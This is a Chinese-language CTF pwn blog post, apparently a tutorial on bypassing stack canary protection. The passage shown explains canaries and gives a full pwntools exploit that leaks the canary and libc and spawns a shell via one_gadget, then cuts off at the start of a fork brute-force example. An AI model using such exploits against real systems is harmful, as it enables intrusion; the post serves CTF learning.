<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">






  <meta name="keywords" content="pwn," />










<meta name="description" content="ä¼—æ‰€å‘¨çŸ¥ï¼ŒCTF-pwnä¸­çš„elfå¯æ‰§è¡Œç¨‹åºå­˜åœ¨ä»¥ä¸‹å‡ ç§ä¿æŠ¤æªæ–½ï¼šNXã€PIEã€RELROã€Canary">
<meta property="og:type" content="article">
<meta property="og:title" content="Canaryä¿æŠ¤çš„6ç§ç»•è¿‡å§¿åŠ¿">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;index.html">
<meta property="og:site_name" content="N0vice&#39;s Blog">
<meta property="og:description" content="ä¼—æ‰€å‘¨çŸ¥ï¼ŒCTF-pwnä¸­çš„elfå¯æ‰§è¡Œç¨‹åºå­˜åœ¨ä»¥ä¸‹å‡ ç§ä¿æŠ¤æªæ–½ï¼šNXã€PIEã€RELROã€Canary">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;1.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;2.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;3.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;4.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;7.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;5.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;6.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;8.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;9.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;11.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;12.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;13.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;14.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;15.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;16.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;18.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;17.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;19.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;20.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;21.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;22.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;23.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;24.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;25.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;26.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;27.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;28.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;29.png">
<meta property="article:published_time" content="2021-01-20T14:19:09.000Z">
<meta property="article:modified_time" content="2021-01-20T17:34:30.167Z">
<meta property="article:author" content="N0vice">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;01&#x2F;20&#x2F;Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF&#x2F;1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2021/01/20/Canaryä¿æŠ¤çš„6ç§ç»•è¿‡å§¿åŠ¿/"/>





  <title>Canaryä¿æŠ¤çš„6ç§ç»•è¿‡å§¿åŠ¿ | N0vice's Blog</title>
  








<meta name="generator" content="Hexo 4.1.0"></head>
<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
<script src="/live2d-widget/autoload.js"></script>
<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">N0vice's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            å…³äº
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="N0vice">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="N0vice's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Canaryä¿æŠ¤çš„6ç§ç»•è¿‡å§¿åŠ¿</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-01-20T22:19:09+08:00">
                2021-01-20
              </time>
            
            

            

            
          </span>

          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒCTF-pwnä¸­çš„elfå¯æ‰§è¡Œç¨‹åºå­˜åœ¨ä»¥ä¸‹å‡ ç§ä¿æŠ¤æªæ–½ï¼šNXã€PIEã€RELROã€Canary<a id="more"></a><br>è¿™ç¯‡æ–‡ç« è®²Canaryçš„ä¿æŠ¤çš„ç»•è¿‡å§¿åŠ¿ï¼Œç›®å‰å­¦ä¹ åˆ°çš„æ–¹æ³•æœ‰6ç§ï¼Œå…¶å®è¿™äº›ä¸œè¥¿æˆ‘å·²ç»åœ¨çº¿ä¸Šçº¿ä¸‹è®²è¿‡äº†3éï¼Œä½†æ˜¯ä¸€ç›´å¾ˆæ‡’æ²¡æœ‰å½¢æˆæ–‡å­—ï¼Œä»Šå¤©ç‰¹åœ°å†™ä¸€ä¸‹ï¼Œæ„å‘³ç€æ‡’ğŸ•äº†è¿™ä¹ˆä¹…çš„ä¸€ä¸ªæ–°å¼€ç«¯å§</p>
<h2 id="Canaryä»‹ç»"><a href="#Canaryä»‹ç»" class="headerlink" title="Canaryä»‹ç»"></a>Canaryä»‹ç»</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Canaryä¸­æ–‡æ„è¯‘ä¸ºé‡‘ä¸é›€ï¼Œæ¥æºäºè‹±å›½çŸ¿äº•å·¥äººç”¨æ¥æ¢æŸ¥äº•ä¸‹æ°”ä½“æ˜¯å¦æœ‰æ¯’çš„é‡‘ä¸é›€ç¬¼å­ã€‚å·¥äººä»¬æ¯æ¬¡ä¸‹äº•éƒ½ä¼šå¸¦ä¸Šä¸€åªé‡‘ä¸é›€ã€‚å¦‚æœäº•ä¸‹çš„æ°”ä½“æœ‰æ¯’ï¼Œé‡‘ä¸é›€ç”±äºå¯¹æ¯’æ€§æ•æ„Ÿå°±ä¼šåœæ­¢é¸£å«ç”šè‡³æ­»äº¡ï¼Œä»è€Œä½¿å·¥äººä»¬å¾—åˆ°é¢„è­¦</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•æŠŠå®ƒç†è§£æˆä¸€ä¸ªç±»ä¼¼äºcookieä¹‹ç±»çš„ä¸œè¥¿ï¼Œç¨‹åºæ‰§è¡Œæ—¶éœ€è¦éªŒè¯å®ƒæ˜¯æ­£ç¡®çš„æ‰èƒ½æ­£å¸¸å‘ä¸‹æ‰§è¡Œ<br>é€šå¸¸çš„æ ˆæº¢å‡ºåˆ©ç”¨ï¼Œéœ€è¦è¦†ç›–è¿”å›åœ°å€ä»¥æ§åˆ¶ç¨‹åºæµï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨è¦†ç›–è¿”å›åœ°å€ä¹‹å‰æ’å…¥ä¸€ä¸ªå«Canaryçš„cookieä¿¡æ¯ï¼Œå½“å‡½æ•°è¿”å›ä¹‹æ—¶æ£€æµ‹Canaryçš„å€¼æ˜¯å¦è¢«æ›´æ”¹ï¼Œå°±å¯ä»¥åˆ¤æ–­æ˜¯å¦å‘ç”Ÿäº†æ ˆæº¢å‡ºè¿™ç§å±é™©è¡Œä¸ºï¼Œå¦‚æœCanaryè¢«æ›´æ”¹ï¼Œç¨‹åºä¼šå»æ‰§è¡Œ__stack_chk_failå‡½æ•°å¹¶ç»“æŸã€‚<br>ä¸€èˆ¬æ¥è¯´ï¼Œcanaryå¤§éƒ¨åˆ†æƒ…å†µéƒ½æ˜¯åœ¨rbp-0x8çš„ä½ç½®<br><img src="1.png" alt=""><br>æ ˆä¸­çš„canaryå¤§æ¦‚é•¿è¿™æ ·<br><img src="2.png" alt=""></p>
<h2 id="è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary"><a href="#è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary" class="headerlink" title="è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary"></a>è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary</h2><p>æœ‰äº›å­˜åœ¨æº¢å‡ºæ¼æ´çš„ç¨‹åºï¼Œåœ¨è¦æ±‚æˆ‘ä»¬è¾“å…¥å­—ç¬¦åï¼Œä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æ‰“å°å‡ºæ¥ï¼Œè€Œcanaryçš„æœ€ä½ä½æ˜¯\x00ï¼Œæ˜¯ä¸ºäº†è®©canaryå¯ä»¥æˆªæ–­è¾“å…¥çš„å­—ç¬¦ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æº¢å‡ºï¼Œå¤šè¦†ç›–ä¸€ä¸ªå­—èŠ‚ï¼Œå°†\x00ç»™è¦†ç›–æ‰ï¼Œé‚£ä¹ˆcanaryå°±ä¼šå’Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦è¿èµ·æ¥ï¼Œé‚£ä¹ˆï¼Œç¨‹åºæ‰“å°æ—¶æ²¡æœ‰æ£€æŸ¥æ‰“å°å­—ç¬¦çš„é•¿åº¦çš„è¯ï¼Œå°±å¯ä»¥è¿å¸¦ç€Canaryæ‰“å°å‡ºæ¥äº†ï¼Œç„¶åå†æ¬¡æº¢å‡ºï¼Œå°†æ³„éœ²å‡ºçš„canaryå¡«å…¥åŸæ¥çš„ä½ç½®ï¼Œå°±å¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€äº†</p>
<h3 id="ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ-å¦é—¨é‚€è¯·èµ›pwn1"><a href="#ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ-å¦é—¨é‚€è¯·èµ›pwn1" class="headerlink" title="ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ_å¦é—¨é‚€è¯·èµ›pwn1"></a>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ_å¦é—¨é‚€è¯·èµ›pwn1</h3><p>åˆ†æä¸‹ä»£ç <br><img src="3.png" alt=""><br>å­˜åœ¨æ ˆæº¢å‡ºï¼Œcanaryåœ¨rbp-0x8çš„ä½ç½®ï¼Œå¯ä»¥å°†è¾“å…¥çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥<br>é‚£æ€è·¯å°±å¾ˆæ˜ç¡®äº†<br>å…ˆé€šè¿‡å¤šå†™1å­—èŠ‚å°†\x00è¦†ç›–ï¼Œç„¶åæ‰“å°æ³„éœ²Canaryï¼Œæœ€åç›´æ¥ROP<br>è¦†ç›–å®Œå¤§æ¦‚é•¿è¿™æ ·<br><img src="4.png" alt=""></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">binary = <span class="string">'./babystack'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p=process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">""</span>,)</span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400a93</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">start = <span class="number">0x0000000000400720</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0x88</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"a"</span> * <span class="number">0x88</span> + <span class="string">'\n'</span>)</span><br><span class="line">    canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    log.success(<span class="string">"canary==&gt;"</span> + hex(canary))</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">"a"</span>*<span class="number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))</span><br><span class="line">    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))</span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf1207</span></span><br><span class="line">    payload = <span class="string">"a"</span> * <span class="number">0x88</span> + p64(canary) + <span class="string">"a"</span>*<span class="number">8</span> + p64(one_gadget)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary"><a href="#Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary" class="headerlink" title="Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary"></a>Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary</h2><p>Forkå‡½æ•°åˆ›å»ºå­è¿›ç¨‹ç›¸å½“äºå¤åˆ¶ä¸€ä»½å½“å‰è¿›ç¨‹ï¼Œå¹¶ä¸”å…¶ä¸­çš„å†…å­˜å¸ƒå±€ä»¥åŠå˜é‡ç­‰ï¼ŒåŒ…æ‹¬canaryéƒ½ä¸çˆ¶è¿›ç¨‹ä¸€è‡´<br>é‚£ä¹ˆæ¯æ¬¡ç¨‹åºæŒ‚äº†ï¼Œéƒ½ç›¸å½“äºä¼šå†é‡æ–°å¼€å§‹ä¸€é<br>é‚£æˆ‘ä»¬å¯ä»¥é€ä½çˆ†ç ´canaryï¼Œå¦‚æœç¨‹åºæŒ‚äº†å°±è¯´æ˜è¿™ä¸€ä½ä¸å¯¹ï¼Œå¦‚æœç¨‹åºæ­£å¸¸å°±å¯ä»¥æ¥ç€è·‘ä¸‹ä¸€ä½ï¼Œç›´åˆ°çˆ†ç ´å‡ºæ­£ç¡®çš„canary</p>
<h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p>è¿™åŸºæœ¬ä¸Šéƒ½æ˜¯ç›´æ¥ä»veritasğŸ‘´ğŸ‘´çš„blogé‡Œæ‘˜å‡ºæ¥çš„</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 